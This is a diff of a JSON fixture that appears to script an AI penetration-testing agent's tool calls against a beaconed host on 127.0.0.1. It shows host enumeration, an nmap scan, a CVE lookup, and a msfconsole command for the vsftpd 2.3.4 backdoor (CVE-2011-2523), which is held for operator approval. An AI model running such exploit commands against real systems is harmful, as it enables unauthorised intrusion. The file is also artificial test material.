@@ -1,68 +1,185 @@
 {
   "orchestrator": [
-    {"calls": [{"name": "set_phase",
-                "arguments": {"phase": 2,
-                              "note": "One beacon is checked in. Enumerating the host and what it can reach before anything louder."}}]},
-
-    {"calls": [{"name": "dispatch_task",
-                "arguments": {"task_name": "host and neighbours",
-                              "task_description": "On the checked-in beacon: identify the host, its user context, its listening ports and the hosts it can see on the local segment. Read only."}}]},
-
-    {"calls": [{"name": "remember_finding",
-                "arguments": {"host": "127.0.0.1",
-                              "finding_type": "service",
-                              "data": "vsftpd 2.3.4 answering on 2121 — a version with a known backdoor"}}]},
-
-    {"calls": [{"name": "set_phase",
-                "arguments": {"phase": 4,
-                              "note": "A service version worth checking against known vulnerabilities."}}]},
-
-    {"calls": [{"name": "dispatch_task",
-                "arguments": {"task_name": "version to vulnerability",
-                              "task_description": "Look up vsftpd 2.3.4 against the CVE data and the local exploit database. Report what exists; do not run anything against the service yet."}}]},
-
-    {"calls": [{"name": "set_phase",
-                "arguments": {"phase": 5,
-                              "note": "CVE-2011-2523 matches the banner. Exploitation needs approval, so it is proposed rather than taken."}}]},
-
-    {"calls": [{"name": "dispatch_task",
-                "arguments": {"task_name": "proposed exploitation",
-                              "task_description": "Against 127.0.0.1:2121, attempt the vsftpd 2.3.4 backdoor for CVE-2011-2523. This is tier 2 and will be put to the operator."}}]},
-
-    {"text": "Phases 2, 4 and 5 are done as far as they can go unattended. The host is identified, its services enumerated, and the one exploitable version found was put to the operator rather than acted on."}
+    {
+      "calls": [
+        {
+          "name": "set_phase",
+          "arguments": {
+            "phase": 2,
+            "note": "One beacon is checked in. Enumerating the host and what it can reach before anything louder."
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "dispatch_task",
+          "arguments": {
+            "task_name": "host and neighbours",
+            "task_description": "On the checked-in beacon: identify the host, its user context, its listening ports and the hosts it can see on the local segment. Read only."
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "remember_finding",
+          "arguments": {
+            "host": "127.0.0.1",
+            "finding_type": "service",
+            "data": "vsftpd 2.3.4 answering on 2121 — a version with a known backdoor"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "set_phase",
+          "arguments": {
+            "phase": 4,
+            "note": "A service version worth checking against known vulnerabilities."
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "dispatch_task",
+          "arguments": {
+            "task_name": "version to vulnerability",
+            "task_description": "Look up vsftpd 2.3.4 against the CVE data and the local exploit database. Report what exists; do not run anything against the service yet."
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "set_phase",
+          "arguments": {
+            "phase": 5,
+            "note": "CVE-2011-2523 matches the banner. Exploitation needs approval, so it is proposed rather than taken."
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "dispatch_task",
+          "arguments": {
+            "task_name": "proposed exploitation",
+            "task_description": "Against 127.0.0.1:2121, run the prepared Metasploit resource script for the vsftpd 2.3.4 backdoor (CVE-2011-2523). This is tier 2 and will be put to the operator rather than taken."
+          }
+        }
+      ]
+    },
+    {
+      "text": "Phases 2, 4 and 5 are done as far as they can go unattended. The host is identified, its services enumerated, and the one exploitable version found was put to the operator rather than acted on."
+    }
   ],
-
   "executor": [
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "uname -a", "beacon_id": "{{BEACON_ID}}"}}]},
-
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "id", "beacon_id": "{{BEACON_ID}}"}}]},
-
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "netstat -an -p tcp", "beacon_id": "{{BEACON_ID}}"}}]},
-
-    {"calls": [{"name": "log_discovery",
-                "arguments": {"host": "127.0.0.1", "finding_type": "host",
-                              "data": "Darwin on arm64, user context is unprivileged, several loopback listeners"}}]},
-
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "nmap -sV --top-ports 1000 127.0.0.1", "server_side": true}}]},
-
-    {"text": "The host is a Darwin arm64 machine running as an unprivileged user. Loopback has a handful of listeners; 2121 answers with a vsftpd 2.3.4 banner."},
-
-    {"calls": [{"name": "lookup_cve",
-                "arguments": {"service": "vsftpd", "version": "2.3.4"}}]},
-
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "searchsploit vsftpd 2.3.4", "server_side": true}}]},
-
-    {"text": "vsftpd 2.3.4 carries CVE-2011-2523, a backdoor in the shipped tarball, CVSS 9.8. A Metasploit module exists for it."},
-
-    {"calls": [{"name": "run_command",
-                "arguments": {"command": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 127.0.0.1; set RPORT 2121; run\"",
-                              "server_side": true}}]},
-
-    {"text": "Exploitation was not carried out: it is a tier 2 action and is waiting on the operator's decision in the drawer."}
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "shell uname -a",
+            "beacon_id": "{{BEACON_ID}}"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "shell id",
+            "beacon_id": "{{BEACON_ID}}"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "shell netstat -an -p tcp",
+            "beacon_id": "{{BEACON_ID}}"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "log_discovery",
+          "arguments": {
+            "host": "127.0.0.1",
+            "finding_type": "host",
+            "data": "Darwin on arm64, user context is unprivileged, several loopback listeners"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "nmap -sV -p 22,2121,18500 127.0.0.1",
+            "server_side": true
+          }
+        }
+      ]
+    },
+    {
+      "text": "The host is a Darwin arm64 machine running as an unprivileged user. Loopback has a handful of listeners; 2121 answers with a vsftpd 2.3.4 banner."
+    },
+    {
+      "calls": [
+        {
+          "name": "lookup_cve",
+          "arguments": {
+            "service": "vsftpd",
+            "version": "2.3.4"
+          }
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "searchsploit vsftpd 2.3.4",
+            "server_side": true
+          }
+        }
+      ]
+    },
+    {
+      "text": "vsftpd 2.3.4 carries CVE-2011-2523, a backdoor in the shipped tarball, CVSS 9.8. A Metasploit module exists for it."
+    },
+    {
+      "calls": [
+        {
+          "name": "run_command",
+          "arguments": {
+            "command": "msfconsole -q -r /tmp/vsftpd_2121.rc",
+            "server_side": true
+          }
+        }
+      ]
+    },
+    {
+      "text": "Exploitation was not carried out: msfconsole with a resource script is a tier 2 action and is waiting on the operator's decision in the drawer."
+    }
   ]
 }
